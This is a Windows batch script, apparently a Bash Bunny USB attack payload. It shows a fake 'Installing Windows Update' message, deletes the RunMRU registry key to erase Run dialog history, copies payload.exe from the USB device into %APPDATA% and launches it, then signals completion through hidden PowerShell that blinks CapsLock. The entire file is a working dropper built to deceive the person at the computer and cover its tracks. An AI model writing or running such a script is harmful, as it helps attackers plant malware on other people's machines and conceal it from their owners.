@echo off
@echo Installing Windows Update

REM Delete registry keys storing Run dialog history
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f

REM Below is for copying a directory with a payload inside the root directory of the Bash Bunny USB Mass Storage.
REM echo d | xcopy /C /Q /Y /E %~dp0\..\..\PAYLOAD_FOLDER_IN_ROOT %APPDATA%\PAYLOAD_FOLDER_IN_ROOT

REM Copy payload.exe from the root of the bash Bash Bunny USB Mass Storage (change to whatever you like).
copy %~dp0\..\..\payload.exe %APPDATA%\payload.exe

REM Below is for executing a payload inside a directory (see comments above). Change --startup to whatever parameters you wish to pass (or remove it).
REM start "" "%APPDATA%\PAYLOAD_FOLDER_IN_ROOT\payload.exe" --startup

REM Launch payload.exe with the startup parameter. Change --startup to whatever parameters you wish to pass (or remove it).
start "" "%APPDATA%\payload.exe" --startup

REM Blink CAPSLOCK key (from usb_exfiltrator)
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}')"

@cls
@exit